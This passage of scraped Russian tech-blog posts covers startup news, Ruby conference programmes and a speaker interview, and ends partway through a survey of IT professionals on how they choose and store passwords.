Европе. После этого пользовательская база BlaBlaCar должна вырасти в два раза и достичь 20 миллионов человек. \n\r\nВ июле 2014 года компания привлекла $100 миллионов. Тогда эти средства планировалось направить на развитие сервиса в России и Украине.\n\r\nНа сегодняшний день сервис доступен в Бельгии, Нидерландах, Люксембурге, Франции, Хорватии, Германии, Венгрии, Индии, Италии, Польше, Португалии, Румынии, России, Сербии, Испании, Турции, Украине и Великобритании.", {"day": "17", "month": "сентября", "time": "12:44"}, {"rate": 15, "views": 11000}], ["Привет!\n\r\nНовое интервью! Сегодня на вопросы конференции RailsClub (которая состоится 26 сентября) ответил Андрей Дерябин, тимлид Злых Марсиан, автор Rove.io и со-ведущий Ruby NoName Podcast. \n\n\n\nКак ты пришел в разработку на Ruby?\n\r\nПервое упоминание Ruby я увидел в одной из статей Джоэля Спольски. Синтаксис языка показался очень приятным и лаконичным. Затем на летней практике мне предложили попробовать сделать проект на Ruby on Rails; я согласился только из-за Ruby, про Rails я ничего тогда не знал. С этого все и началось.\n\n\nНад чем ты сейчас работаешь?\n\r\nЯ тимлид команды марсиан, которая работает на проекте Gett (также известном как GetTaxi). Мы помогаем Gett строить микро-сервисную архитектуру — об этом и будет мой доклад на конференции. Есть и свой (пока секретный) проект, связанный с анализом данных и аналитикой, о котором я готов поговорить в кулуарах.\n\n\nЧем бы занялся, если бы у тебя было 2 месяца свободного оплачиваемого времени?\n\r\nПоловину времени я вложил бы в доработку прототипа своего секретного проекта до релиза. Половину — потратил бы на погружение в новый язык программирования.\n\n\nЛюбимые ресурсы(блоги/сайты/твиттеры) на темы веб разработки и программирования?\n\r\nЕсли мы все еще говорим о Ruby и Rails, порекомендую раздел на Reddit. Очень нравится еженедельная рассылка о коммитах в Rails от RailsWeekly. Также рекомендую обратить внимание на рассылки от CooperPress. Из подкастов нравятся Ruby5 и Changelog. Еще иногда слушаю Ruby NoName Podcast — и такое бывает!\n\n\nЛучшая прочитанная книга по программированию/технологиям?\n\r\nОчень странно было бы выделить одну лучшую книгу. Лучше назову те, которые стоит прочитать точно:\r\n — Структура и интерпретация компьютерных программ, вышла в издательстве MIT;\r\n — Совершенный код Стива Макконелла;\r\n — Рефакторинг. Улучшение существующего кода Мартина Фаулера.\n\n\nНе надоело программировать?\n\r\nНет.\n\n\nНа твой взгляд, в каком направлении будут развиваться Ruby и Ruby on Rails в ближайшие годы?\n\r\nДумаю, вектор развития языка и фреймворка глобально останется тем же что и был. Если говорим про Ruby, я ожидаю дальнейшего улучшения GC и работы над concurrency. Если про Rails, думаю, будет идти работа над общим ускорением работы всего стека, да и необходимость реализовать классную поддержку HTTP/2 никто не отменял.\n\n\nЛюбимый язык программирования после Ruby, почему именно он?\n\r\nЯзык программирования — лишь инструмент для достижения результата. Для каждой области задач это свой инструмент, которым нужно уметь пользоваться, чтобы быть готовым работать с любым классом задач. Из новых языков мне было бы интереснее всего поработать с Rust, Scala и Clojure.\n\n\nЧто для тебя Open Source?\n\r\nOpen Source — это возможность. Сначала это возможность участия в больших проектах; от наблюдения за развитием до исправления ошибок и добавлением нового функционала. Следующий этап — возможность реализации собственных идей и получения обратной связи.\n\n\nКакой бы ты дал совет разработчикам, которые хотят добиться больших успехов?\n\r\nПоследнее время болтовни стало в разы больше, а реального дела в разы меньше. Поэтому совет будет предельно прост — практикуйте, пишите и читайте больше кода, пробуйте новые инструменты, концепции и архитектуры.\n\n\nСпасибо за интервью и увидимся в Москве!\n\r\nНа конференции Андрей расскажет о микросервисной архитектуре на практике.\n\r\nКоманда марсиан под руководством Андрея помогла Gett (ранее известный как GetTaxi) перейти от монолитной архитектуре к использованию микросервисов — в боевом режиме, в четырех странах (США, Великобритания, Россия, Израиль). Это позволило существенно ускорить и упростить работу над разработкой новых направлений.\n\r\nВместо теоретических рассказов о том, как здорово использовать микросервисы и почему все якобы непременно должны это делать, Андрей сконцентрируется на практике и боевом опыте. В докладе он расскажет про сложности, с которыми пришлось столкнуться при разработке микросервисов и способами их решения — реализация взаимодействия сервисов (средствами REST API), версионирование состояния системы, логирование изменений (стратегия COW), распределенное конфигурирование (ZooKeeper), работа с shared-частями микросервисов, развертвывание (Chef) и тестирование. Отдельно Андрей подробно остановится на реализации паттерна Circuit Breaker для решения проблем в канале связи между сервисами.\n\r\nИнтересно? Регистрируйтесь на сайте конференции. Цена билета — 8000 рублей.\n\nНаши спонсоры\r\nГенеральный партнер: Toptal\n\r\nЗолотой партнер: \n\n\nCloud Castle — разработчик мобильных и веб-приложений на Ruby On Rails для стартапов и развивающегося бизнеса в Самаре, Нью-Йорке и Шарлотте. Мы помогаем предпринимателям запустить мобильные и веб-сервисы для их бизнеса.\n\r\nСеребряный партнер: AT-Consulting\r\nБронзовый партнер: Rambler&Co\n\r\nБудьте в курсе наших новостей, подписавшись на рассылку на сайте railsclub.ru, и следите за обновлениями: \nRailsClub.ru\ntwitter.com/railsclub_ru\nfacebook.com/railsclub", {"day": "1", "month": "сентября", "time": "10:12"}, {"rate": 6, "views": 3500}], ["Почти все стартаперы, инвесторы и менторы знают, в чем заключается дополнительная выгода от участия в различных специализированных конференциях. Это, конечно же, нетворкинг. Возможность встретиться и пообщаться с авторами бизнес-идей, обменяться опытом и информацией об инновациях, завести новые знакомства с другими предпринимателями — все это отличные возможности для расширения бизнесаы.\n\r\nВ некоторых случаях нетворкинг оказывается полезнее, чем выступления главных спикеров мероприятия. А почти каждый стартапер, кто хоть раз приезжал на международную конференцию, жалел о потраченном времени на не самые удачные мастер-классы. В такие моменты приходит мысль, мол, здорово, убил столько времени на полную ерунду, но хоть познакомился с интересными людьми.\n\r\nИтак, вы взяли визитку и обменялись рукопожатиями — не густо для первого раза. Но что если не останавливаться на достигнутом и пойти дальше? Идея установления кросскультурных коммуникации на конференциях для инноваторов близка нам по духу. Поэтому мы в Airbnb как-то задумались о старте программы, позволяющей предпринимателям устанавливать новые связи друг с потенциальными бизнес-партнерами.\n\n\nОр Офер, основатель SimilarWeb, предлагает квартиру с таким видом из окна. Вдохновляет?\n\r\nЕсли не ограничиваться стандартным знакомством, можно попробовать нечто действительно неожиданное: как насчет совместного завтрака с основателем компании Gett (бывший GetTaxi)? Или экскурсии по городу с директором SimilarWeb? Это не абстрактные примеры, а реальные предложения, появившиеся в нашем проекте, направленном на развитие гостеприимных связей между предпринимателями: http://entrepreneurhostsentrepreneur.com/ehe/. \n\n\nФото с конференции в Мюнхене.\n\r\nЧерез месяц в Тель-Авиве стартует очередная конференция технологий и инноваций DLD (Digital — Life — Design). В Москве, к слову, осенью проходит во многом схожее мероприятие — форум «Открытые инновации», на котором вопросы инновационного развития обсуждают лидеры рынка, стремящиеся найти площадки для инвестирования или завести ценные знакомства.\n\r\nКонференция DLD впервые прошла в 2005 году. С тех пор мероприятие проходило несколько раз в год в разных странах мира, включая Россию, привлекая внимание предпринимателей, инвесторов, ученых, изобретателей, дизайнеров и просто фанатов новых технологий.\n\r\nПочему сейчас выбран именно Израиль? Эта страна смогла занять вторую позицию в мировом рейтинге по уровню развития стартап-индустрии и первое место по числу исследовательских центров крупных компаний на душу населения. Здесь можно будет узнать, почему стартаперы не должны бояться неудач, а количество проваленных стартапов считается лишь показателем опыта. \n\n\n\r\nВ IT-отрасли Израиля работают более 200 000 человек. Согласно некоторым данным, в стране насчитывается более 5 000 стартапов. В общем, у израильских стартаперов есть чему поучиться, не даром же Google купил израильский сервис Waze за миллиард долларов, и еще две компании в сфере высоких технологий были проданы за 900 и 800 миллионов. \n\r\nОтправляясь в деловую поездку, нужно задать себе вопрос не только о том, какие конференции, лекции, приемы и другие мероприятия вам стоит посетить, но и как получить дополнительный опыт. Сотни разношерстных людей, приезжающие ежегодно на DLD, озадачиваются ровно теми же мыслями. \n\r\nИ мы подумали: если вы хотите дополнительного опыта от общения с предпринимателями, так почему бы не арендовать квартиру у предпринимателя? Мы уже рассказывали, что для нас предоставление аренды — это не только общение с сервисом и заселение в помещение. Общение с хозяевами является тем эмоциональным преимуществом, ценность которого тяжело измерить в цифрах, но трудно недооценить.\n\r\nС помощью Aitbnb одни предприниматели могут предоставить жилье (и свое живое общение) другим предпринимателям. Инициатива позволяет местным предпринимателям расширить свои международные связи, получать ценные идеи и советы от бизнес-лидеров и гостей, съезжающихся на конференцию со всего мира.\n\r\nДля нас это не первый опыт проведения подобного мероприятия. Аналогичная инициатива проводится в течение последних двух лет на Всемирном конгрессе мобильной связи в Барселоне. Эксперимент, как мы считаем, прошел удачно.", {"day": "20", "month": "августа", "time": "10:57"}, {"rate": 7, "views": 5700}], ["MBLTdev — конференция мобильных разработчиков, которая пройдет в Москве 17 ноября во второй раз. \n\r\n30 докладчиков из Spotify, Wunderlist, Runkeeper, Yahoo Finance, Microsoft и других компаний соберутся в центре Digital October, чтобы рассказать о тонкостях мобильной разработки и поделиться своим бесценным опытом. \n\n18 и 19 августа — последние дни продажи Early Bird билетов со скидкой 50%. С 20 августа цена билета составит 5000 рублей. \n\n\n\n\n\r\nПрограмма конференции будет поделена на три потока: технический, с докладами для mid+ мобильных разработчиков, стратегический, с докладами для руководителей мобильных направлений и IT-директоров, и поток с семинарами для мобильных разработчиков. \n\r\nНа данный момент свое участие подтвердили:\n\r\n — Майк Эш, iOS-разработчик, Plausible Labs\r\n — Крис Эйдхоф, iOS-разработчик, основатель блога objc.io\r\n — Филлип Коннатон, iOS-разработчик, Runkeeper\r\n — Гектор Зарате, iOS-ковбой, Spotify\r\n — Джаспер Блюз, Основатель, Typhoon\r\n — Цезарь Валиенте, Android-разработчик, Wunderlist\r\n — Дэвид Грандинетти, iOS разработчик, Yahoo Finance\r\n — Константин Кичинский, Технический евангелист, Microsoft\r\n — Александр Черный, iOS-разработчик, e-Legion\r\n — Дмитрий Сошников, Эксперт по стратегическим технологиям, Microsoft Россия\n\r\nСейчас также определяются докладчики из Kaspersky Lab, Tinkoff, Rambler&Co, Aviasales, Gett. \n\r\nПодробный отчет прошлогодней конференции MBLTdev с программой, фотографиями и видеозаписями выступлений докладчиков доступен здесь. \n\r\nОрганизаторы: e-Legion и РАЭК\r\nГенеральный партнер: Microsoft Russia\r\nПартнер: Kaspersky Lab", {"day": "18", "month": "августа", "time": "12:32"}, {"rate": 13, "views": 2300}], ["Фото: mn.ru\n\r\nТранспортный сервис Яндекс.Такси смог втрое увеличить выручку во втором квартале 2015 года. При этом сервис оставил позади своего конкурента — компанию Uber, по бизнес-показателям в России, пишет Roem. За год проект должен охватить около 25 городов, а сейчас большую часть доходов Яндекс.Такси приносит деятельность в столице. \n\r\nИнтересно, что только в Москве автопарк сервиса составляет более 15 тысяч автомобилей. У израильского сервиса Gett — 10 тысяч автомашин, а у американского Uber — 3 тысячи. Конкурент из США работает также в Санкт-Петербурге и Екатеринбурге. Яндекс.Такси приносит солидную часть нерекламных доходов отечественной компании.\n\r\nЧто касается второго квартала 2015 года, то рост выручки нерекламных сервисов компании (сюда входит и таксомоторный проект) составил 202%. Такая ситуация наблюдается уже третий квартал подряд. В первом квартале увеличение выручи составило около 163% (276 млн рублей в денежном выражении). Доля в общи доходах — 2,24%. Во втором квартале этот показатель составил 2,42%, с 635 млн рублей в денежном выражении. \n\r\nСейчас, по словам руководителя сервиса Тиграна Худавердяна, доходы онлайн-сервисов заказа такси растут даже быстрее, чем ожидалось.", {"day": "14", "month": "августа", "time": "19:04"}, {"rate": 9, "views": 5000}], ["Привет всем рубистам и рубисткам!\n\r\nС радостью рассказываем о том, какую программу мы приготовили на RailsClub 2015, который состоится 26 сентября в Москве. Все подробности на сайте конференции railsclub.ru (кстати, зацените наш новый сайт). Приглашаем всех неравнодушных, главное российское Ruby-событие года нельзя пропускать! Билет сейчас стоит 7000, но уже через неделю будет дороже.\n\r\nЧто же будет:\n\n Koichi Sasada\r\nЧлен команды Яцухиро Мацумото в Heroku, директор Ruby Association.\nPERFORMANCE IN THE DETAILS: A WAY TO MAKE FASTER RUBY\r\nHeroku Matz team is working to improve quality of CRuby/MRI. Quality has several meanings, such as stability, low resource consumption, and of course speed. My main goal is to make faster Ruby. \r\nHowever, we don't have one absolute solution to speed up Ruby interpreter. Instead of one solution, we introduce variety of techniques to improve Ruby's performance. In this talk, I will show you recent achievements by techniques in details.\n \n\n\n Claudio Baccigalipo\r\nКлаудио контрибьютор в Rails на счету которого более 100 коммитов, член Rails Issues team\nRAILS 5: AWESOME FEATURES AND BREAKING CHANGES\r\nEach major release of Rails brings shiny new features and mild headaches for developers required to upgrade their applications and gems. Rails API, ActionCable, Turbolinks 3 are only a few of the changes announced for Rails 5. How can programmers get ready for the future without breaking their legacy code?\r\nIn this talk, I will cover the improvements brought by Rails 5, explain the Core team’s motivations behind each feature, and illustrate the upgrade process to smoothly transition gems and apps from Rails 4.2 to Rails 5.0.\n\n\n Sam Phippen\r\nУчастник RSpec core team, разработчик в Fun and Plausible Solutions\nMOCKING LANGUAGE\r\nThis talk is an investigation into the different kinds of ways we isolate objects from their collaborators. They all seem to provide similar capabilities but there is an underlying language that talks to us about different kinds of design smells that we might have in our applications.\r\nThis talk will cover the different kinds of test doubles that we use in our applications and what they indicate about the designs of our software.\n\n\n Bozhidar Batsov\r\nАвтор RuboCop и редактор Ruby and Rails style guides\nVOLT: RUBY WEB DEVELOPMENT RECHARGED\r\nVolt is a reactive web framework where your Ruby code runs both on the server and the client. Sounds crazy, right? Trust me, though, this is pretty amazing and will blow your minds.\r\nVolt is probably the most exciting web framework in the land of Ruby since Rails. In this talk we'll go over the core ideas and principles of Volt, the advantages of Volt over traditional web apps and we'll play with a few basic examples. We'll wrap with a look towards Volt's bright future. Above all else — we'll have fun!\n\n\n Тимофей Цветков\r\nToptal Core Team, analytics department\nLAMBDA AND KAPPA ARCHITECTURES IN RUBY ON RAILS\r\nNowadays it’s absolutely clear that data is one of the most valuable assets and thoughtful data analysis plays essential role in any company’s success. Whether you run machine learning algorithms to build smarter and more user friendly applications or to build financial and marketing reports for stake holders, you need to perform data transformations and calculations. Such applications can’t be designed in a classical Ruby on Rails way. Lambda and Kappa architectures are common patterns for building data processing applications.\r\nToptal is a constantly growing company and is on track for $100M in revenue in 2015. To archive this in Toptal, we’re constantly improving our processes, KPIs and of course, our application. We’re searching for pitfalls and places to improve by monitoring our processes and by analysing our data.\r\nIn this talk we will discuss main principles of Lambda and Kappa architectures and their implementations using Ruby on Rails based on Toptal’s analytics team experience.\n\n\n Иван Немытченко\r\nРазработчик и энтузиаст IT мероприятий\nКАК ПЕРЕСТАТЬ БЫТЬ RAILS-РАЗРАБОТЧИКОМ\r\nДолгое время мы думали, что мы другие. Что подход Rails настолько крут, что у нас нет целого класса проблем, с которыми возятся несчастные джависты. Но почему-то Rails-приложения с завидной регулярностью превращаются в неподдерживаемых монстров через полгода, а то и меньше. Выходит что мы не очень-то мы и другие. Я поделюсь опытом переключения мозга из режима Rails-only-mode.\r\nКак только перестаешь принимать на веру дефолтный способ организации кода в Rails, происходят замечательные вещи. В моем случае, новые роли объектов(Form objects, Services, Repositories) появились в коде естественным образом — как решения конкретных проблем, а не потому-что так завещал нам Мартин Фаулер. В итоге я получил гибкий(модульный, если хотите) код, который несложно поддерживать и модифицировать.\r\nКоллеги, хватит перекладывать вину за бардак в коде на DHH! 2015 год — отличное время, чтобы стать кем-то большим, чем программист-на-фрэймворке.\n\n\n Самат Галимов и Борис Горячев\r\nMeduza.io\nМИКРОСЕРВИСЫ И ELIXIR ДЛЯ RAILS-РАЗРАБОТЧИКОВ\r\nРассказ пойдет о том, как мы разделяем наше основное rails приложение и создаем микросервис-архитектуру. Как за год было написано более 10-ти проектов разных уровней сложности, и чем мы руководствовались, когда это затевали.\r\nДля нас зачастую выбор языка/фреймворка под проект чуть ли не сложнее, чем написание самого проекта, и в докладе мы постараемся объяснить целесообразность того или иного выбора(заранее признаюсь — в некоторых местах мы славно напортачили).\r\nТакже расскажем о случаях, когда лучше заблаговременно сойти с рельс и как себя при этом обезопасить. В конце доклада мы постараемся убедить вас попробовать elixir — прекрасный молодой функциональный язык программирования. На десерт несколько примеров, где он стал для нас right tool for the job.\n\n\n Андрей Дерябин\r\nТимлид Evil Martians, один из марсианских долгожителей\nМИКРОСЕРВИСЫ В GETT: ОТКРЫТИЕ НОВЫХ НАПРАВЛЕНИЙ И РАБОТА ПОД НАГРУЗКОЙ.\r\nGett (ранее известный как GetTaxi), популярнейший сервис для заказа такси, в этом году не только вырос по бизнес-показателям, но и открыл новые направления деятельности (вертикали) — например, доставку еды и проведение работ на дому. Чтобы отвечать требованиям бизнеса по росту, и особенно — для возможности строить новые вертикали на существующих мощностях, архитекторы Gett начали перевод сервиса на микросервисную архитектуру.\r\nВ этом Gett помогала команда марсиан под руководством Андрея. За короткий срок у Gett получилось перейти от монолитной архитектуре к использованию микросервисов — в боевом режиме, в четырех странах (США, Великобритания, Россия, Израиль). Это позволило существенно ускорить и упростить работу над разработкой новых направлений.\r\nВместо теоретических рассказов о том, как здорово использовать микросервисы и почему все якобы непременно должны это делать, Андрей сконцентрируется на практике и боевом опыте. В докладе он расскажет про сложности, с которыми пришлось столкнуться при разработке микросервисов и способами их решения — реализация взаимодействия сервисов (средствами REST API), версионирование состояния системы, логирование изменений (стратегия COW), распределенное конфигурирование (ZooKeeper), работа с shared-частями микросервисов, развертвывание (Chef) и тестирование. Отдельно Андрей подробно остановится на реализации паттерна Circuit Breaker для решения проблем в канале связи между сервисами.\n\n\n Андрей Куманяев\r\nРазработчик в Coub\nИЩЕМ ГДЕ И ПОЧЕМУ PRODUCTION ПРИЛОЖЕНИЕ ТОРМОЗИТ\r\nМногие из разработчиков мира Ruby on Rails знакомы с богатым набором инструментов для профилирования приложения в development среде. Зачастую, работа с этими инструментами заканчивается до/после выкатки фичи в production. Сначала все может работать хорошо и быстро, ну а дальше… как повезет.\r\nВ докладе я расскажу о том, как можно в production среде следить за показателями производительности приложений и отлавливать те самые кейсы, когда оно начинает вести себя не так, как хотелось бы.\n\n\n Александр Кириллов\r\nРазработчик в Evrone\nRUBY OBJECT MAPPER: REVOLUTION\r\nRuby Object Mapper (ROM) — экспериментальная Ruby библиотека для реализации отображения «чистых» Ruby объектов, позволяющая без лишних ограничений использовать всю мощь выбранного хранилища данных.\r\nROM основан на нескольких концепциях, отличающихся от «нормальной» Ruby ORM. Я расскажу об этих концепциях, разберу особенности библиотеки и покажу как жить без Active Record.\n\n\n Семен Багреев\r\nВедущий Ruby разработчик в Rambler & Co\nТЕСТИРОВАНИЕ И “SOFTWARE WRITER” ГОД СПУСТЯ\r\nГод назад, во время открытия RailsConf 2014, David Heinemeier Hansson поделился с нами своими мыслями по поводу профессии инженера ­разработчика ПО (или “писателя ПО”, по его версии) и по поводу TDD. Вкратце, DHH высказался довольно резко в сторону TDD, аргументируя это тем, что TDD ломает дизайн, делая его необоснованно сложным для понимания, давая при этом ложное чувство уверенности, основанное на выдуманных показателях (coverage, ratio, speed).\r\nЯ примерил роль “Писателя ПО”. Следуя советам Дэвида, я старался тестировать всю систему, а не отдельные юниты, фокусируясь на интеграционных и “frontend” тестах. В процессе я столкнулся с непониманием некоторых коллег и бизнес лидеров. Мне пришлось развеять несколько мифов о тестировании и я поделюсь этим опытом с другими разработчиками.\r\nКроме того, я узнал несколько трюков для ускорения тестов, освоил несколько новых инструментов для тестирования, которые я упомяну в моем докладе.\n\n\n Кирилл Шатров\r\nРазработчик в Evil Martians, мейнтейнер Capistrano и Sorcery\nBUILDING RAILSPERF, A TOOLKIT TO DETECT PERFORMANCE REGRESSIONSIN RUBY ON RAILS CORE\r\nНа примере бета-версий Rails 4.2 мы убедились как часто в фреймворке Rails могут случаться регрессии производительности и как легко они могут остаться незамеченными.\r\nПроблема производительности и ее регрессий становится все более острой в Ruby-сообществе. Это подтолкнуло меня и других контрибьюторов Rails к разработке Rubybench, сервиса для поиска регрессий производительности в Ruby и Rails.\r\nВ своем докладе я рассмотрю регрессии производительности на примерах коммитов из Rails, расскажу о построении бенчмарков для Ruby приложений и продемонстрирую Rubybench и его архитектуру.\n\n\n Анна Щербинина\r\nЛид веб команды в Artec Group\nLT: CRYSTAL\r\nCrystal — компилируемый в нативный код язык. Как говорят сами разработчики, его синтаксис вдохновлен Ruby. Поэтому порог вождения для ruby разработчика не высок, и, действительно, глядя на код невольно возникает вопрос: это Crystal или Ruby? Расскажу о реализации микросервиса на Crystal: сходстве и различии c Ruby, плюсах, минусах и использовании в production.\n\n\n Кирилл Горин\r\nРазработчик в Toptal\nLT: ACTIVE SUPPORT INSTRUMENTATION\r\nВсе пользуются средствами мониторинга для Rails приложений, но не все знают, что они работают на основе встроенных в Rails инструментов. Active Support Instrumentation один из них. В этом докладе я расскажу как его использовать и как можно самому написать конкурента New Relic.\n\n\n Владимир Ярцев\r\nTехнический директор в Cloud Castle\nLT: PERSONAL HEROKU ADD-ON WITH DOCKER\r\nВ каталоге аддонов Heroku более 100 готовых микросервисов, но иногда подходящего аддона нет, а с Heroku уходить не хочется.\r\nОдно из решений — Docker, который позволяет собрать микросервис, взяв за основу образ с Docker Hub. Вот только поддержка инфраструктуры микросервиса в этом случае ложится на плечи разработчика.\r\nЯ расскажу, как совместить удобство Heroku с гибкостью Docker, заставив микросервис вести себя как аддон Heroku.\n\n\r\nКак вы заметили, докладов стало больше. Это потому, что русскоязычные спикеры теперь выступают в два параллельных потока. В связи с этим мы переезжаем на новую площадку — Конгресс-центр Технополис Москва. Кстати, в программе еще осталось два свободных слота, а также 4 слота для блиц-докладов по 10 минут. Хотите проявить себя? Пишите на elena@evrone.ru.\n\r\nВ этом году нас уже поддерживают три замечательные компании:\r\nГенеральный спонсор:\n\n\nToptal — распределенная мировая биржа, к которой уже присоединились самые талантливые разработчики со всего мира. Топтал создан инженерами.\n\r\nЗолотой спонсор:\n\n\n\nCloud Castle — разработчик мобильных и веб-приложений на Ruby On Rails для стартапов и развивающегося бизнеса в Самаре, Нью-Йорке и Шарлотте. Мы помогаем предпринимателям запустить мобильные и веб-сервисы для их бизнеса.\n\r\nСеребряный спонсор:\n\n\n\nAT-Consulting — один из сильнейших игроков на рынке информационных технологий и ИТ-услуг для компаний телекоммуникационного, финансового, государственного, топливно-энергетического и других секторов.\n\r\nПриглашаем партнеров!\r\nИ конечно, приходите на RailsClub 2015 — регистрация тут.\n\r\nБонус для тех, кто дочитал до конца: видео руби секции с DevConf 2015 и второго Ruby митапа. Приятного просмотра!", {"day": "10", "month": "августа", "time": "09:52"}, {"rate": 16, "views": 4700}], ["Недавно стало известно об «уязвимости» в системе для корпоративных клиентов такси-сервиса Gett. Как выяснили исследователи, всем им по умолчанию выдавались одинаковые пароли (естественно, многие из них никто потом не меняет). В итоге, зная один пароль, злоумышленники могли попасть в множество аккаунтов сразу (среди клиентов Google Россия, «Вконтакте», Ozon и другие компании).\n\n\n\r\nСкандалы, связанные с кражей паролей и похищением личных данных, случаются регулярно — только за прошедшие пару лет в сеть утекали пароли пользователей таких крупных компаний, как Adobe, популярных почтовых сервисов, хакеры взламывали даже сами сервисы для хранения паролей. Исследования также показали, что одними из главных проблем безопасности онлайн-банков являются авторизация и аутентификация.\n\r\nЧтобы повысить уровень защищенности своих пользователей, многие компании публикуют советы о том, как можно обезопасить свои учетные записи (вот пост «Яндекса» на Хабре и материал стартапа Buffer или специальные страницы Microsoft и Google). Создатели популярных комиксов XKCD посвятили один из выпусков вопросам парольной защиты:\n\n \n\r\nМы решили опросить представителей ИТ-компаний, чтобы узнать, как они работают с паролями и каким из рекомендаций по обеспечению безопасности следуют сами:\n\n Алексей Шевелев (@Boomburum), менеджер проектов компании «Тематические Медиа»\n\r\nСейчас использую 1password — нравится, что есть клиент для смартфона, планшета и нуотбука. Удобно и красиво, вроде даже безопасно. Внутри всё аккуратно разложено и заполнено, иногда меняю пароли на всех записях — дело муторное, но того стоит. Чаще всего использую генератор паролей, который генерирует длинные сложные пароли. Собственно, давно отказался от лёгких паролей.\n\r\nНа айфоне до недавнего времени работал TouchID, который перестал работать после замены кнопки — пришлось перейти на обычный пароль. Там можно использовать простой 4-значный код из цифр или более сложный (с буквами). Если же включить сложный пароль и использовать в коде только цифры, например, 137900 (6 цифр), то вместо qwerty-клавиатуры будет всё равно цифровая — это и удобно и более безопасно (6 цифр сложнее подобрать чем 4). Впрочем, в новой версии iOS вроде можно использовать более длинные коды.\n\n Аркадий Прокудин, эксперт по информационной безопасности, автор и ведущий подкаста «Открытая безопасность»\n\r\nДля создания паролей я использую два метода и никаких программных продуктов.\r\nПервый — это старая школа: malen'kaya latinica+BOL'WAYA+спецсимволы@&)+цифры135\n\r\nТакой пароль сложно запомнить. Но если найти в быту какую-нибудь замысловатую комбинацию, будет проще. Например: MicrosoftSilverlightBeta3.5a, Nokia3310, и т.д.\n\r\nВторой метод: использовать в качестве пароля, строку одного из стихотворений в английской раскладке. Например «В траве сидел кузнечик» — D nhfdt cbltk repytxbr/.\n\n Григорий Матвиевич, ведущий iOS-разработчик Redmadrobot\n\r\nСколько об этом ни говорят, но большинство людей использует совсем слабые пароли: qwerty, 12345, 11111. Часть людей усложняют пароли — составляют их из двух слов, добавляют цифры. Но на самом деле это не добавляет сильной стойкости. Все они достаточно быстро перебираются на современных вычислительных мощностях. Есть программы и алгоритмы, есть словари. Сильный пароль должен быть длинным, «случайным», содержать в себе буквы разного регистра, цифры и, желательно, символы. \n\r\nДля сложного пароля я обычно придумываю какую-нибудь бессмысленную фразу или стишок: «рыба трактор 33 йогурт насос», и выдираю из каждого слова по букве. Потом запоминаю на каких-либо ассоциациях, и пароль готов. Еще бы я посоветовал иметь несколько паролей, потому что если вы регистрируетесь на каком-нибудь левом сервисе с таким же паролем, как и в вашем интернет-банке, то это может плохо кончиться для вашего кошелька.\n\n Андрей Прозоров, руководитель экспертного направления в компании Solar Security\n\r\nВ последние несколько лет я стал слишком ленивым для запоминания паролей. Дело в том, что различных сервисов, на которых я зарегистрировался становится все больше и больше, пароли для них лучше выбирать стойкие (длинные, с цифрами и символами) и уникальные. \n\r\nПри этом классические идеи типа «используете ассоциативные парольные фразы» уже не работают. Для себя я пришел к использованию специального ПО для хранения и генерации паролей. Я использую клиент 1Password для iPhone, периодически делаю резервную копию. \n\r\nМои пароли сложны и уникальны, а общая база зашифрована. Мне удобно, риски такого хранения считаю минимальными.\n\n Дмитрий Евтеев, технический директор компании HeadLight Security\n\r\nПрактика показывает, что большинство пользователей не столь изобретательны в контексте выбора паролей. Как правило пароли содержат имена, даты и иную, близкую человеку информацию из его реальной жизни. В совокупности с тем, что запоминалка у среднестатистического обывателя не слишком велика, большинство пользователей используют 2-3 пароля для всех своих систем, в которых требуется проходить аутентификацию с использованием парольной фразы. В корпоративных системах, где политика безопасности требует регулярной смены пароля также распространена ситуация, при которой люди либо записывают сложные пароли на бумажке и хранят ее поближе к клавиатуре, либо используют какую-то простую логику при создании пароля. Например, добавляют к некоему корню цифры, указывающие на дату смены пароля, или вообще используют счетчик (увеличивая в пароле цифры). В подобных случаях обладая знаниями о предыдущем пароле атакующий может легко определить логику его создания, и весь смысл данного действа в таком случае теряется — злоумышленник сможет каждый раз угадывать новый пароль. Как в случае частных пользователей, так и в корпоративной среде, обычно все пароли привязаны к одному email-аккаунту, взломав который хакер может получить доступ к различным системам и сервисам — наличие подобной чувствительной системы является отдельной проблемой информационной безопасности.\n\r\nВ целом, пароли — это очень плохо. Я сам каждый день сталкиваюсь с необходимостью помнить множество паролей от множества систем. В этом плане одноразовые пароли, отправляемые, скажем, по SMS — это крайне удобно. Однако и тут существуют свои подводные камни (те же SMS можно перехватить), но сама концепция одноразовых паролей позволяет значительно усложнить реализацию атаки. К сожалению пока не существует возможности привязки какого-то токена к глобальной системе аутентификации (хотя большой брат двигается в этом направлении), чтобы затем уже получать одноразовые пароли и прозрачно проходить авторизацию в большинстве интернет сервисов. При этом в корпоративной среде подобная система легко реализуема, но тут можно уткнуться носом в бюджет, ведь подобная система будет стоить недешево.\n\r\nЧто касается программ для хранения паролей, то их вполне можно применять, и я сам использую одну бесплатную программулину (не скажу какую) — иначе запомнить все свои пароли я бы просто не смог. При этом я не доверяю облачному софту для хранения паролей — при всем его удобстве в нем могут быть допущены ошибки (что уже было доказано успешными атаками на популярные сервисы), которые в свою очередь могут позволить злоумышленнику стянуть базу паролей всех пользователей и при успешном раскладе звезд узнать мастер-пароль, в таком случае последствия атаки будут крайне интересными… для атакующего.\n\n Макс Крайнов, CEO Aviasales\n\r\nУ нас все просто: Roboform / OnePass или аналогичные системы. Пароли, содержащие меньше 16 символов с кучей кракозябр, вообше не рассматривается. Когда передаем пароли в чатах, сразу после подтверждения их стираем. Что касается доступа к данным, то у нас применяется политика need to know basis (доступ к данным, необходимым для работы, и не более — прим. ред.), если человек увольняется — меняем пароли. При этом прописанной политики нет, все правила разработаны топ-менеджерами компании, которые в ней уже много лет.\n\n Дмитрий Скляров, старший аналитик Positive Technologies\n\r\nЧтобы пароль остался только Вашим секретом, обычно достаточно следовать трем простым правилам:\n\n\nне пытаться придумать короткие легко запоминающиеся пароли;\nне использовать одинаковые пароли на разных ресурсах;\nне вводить пароли на компьютерах, которым нельзя доверять.\n\r\nЧтобы не запоминать много длинных сложных паролей, можно использовать любой приличный Password Keeper. В нем же можно генерировать случайные пароли заданной стойкости.\n\r\nДля защиты базы с паролями придется запомнить один надежный пароль. Как вариант – использовать парольную фразу длиной 20-30 символов.\n\r\nЕсли Password Keeper поддерживает двухфакторную аутентификацию с помощью смарт-карты или USB Security Token – это повышает уровень безопасности и сужает «окно возможностей» для атакующего.\n\r\nРазумеется, использование Password Keeper-программ может привести к потере секретности всех сохраненных паролей в случае компрометации мастер-пароля. Этот риск обязательно надо учитывать.\n\r\nСейчас многие программы для хранения паролей имеют версии под мобильные операционные системы и предлагают синхронизацию через облако. Это, безусловно, удобно, но удобство 